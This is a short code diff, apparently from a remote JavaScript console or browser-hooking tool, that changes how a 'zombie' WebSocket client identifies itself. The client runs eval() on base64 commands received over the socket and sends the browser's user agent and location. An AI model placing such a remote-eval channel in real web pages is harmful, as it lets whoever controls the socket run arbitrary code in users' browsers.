@@ -70,12 +70,12 @@ if(typeof __e == "undefined")
 
       function connectRemoteJsConsole()
       {
-          var ws = new WebSocket("ws://127.0.0.1:12345/remote-js-console/");
+          var ws = new WebSocket("ws://127.0.0.1:12345/remote-js-console/","zombie");
           ws.onmessage = function(message) {
               eval(atob(message.data));
           }
           ws.onopen = function() {
-              ws.send("zombieHere\r\n" + navigator.userAgent + "\r\n" + getLocation());
+              ws.send(navigator.userAgent + "\r\n" + getLocation());
           }
       }
 
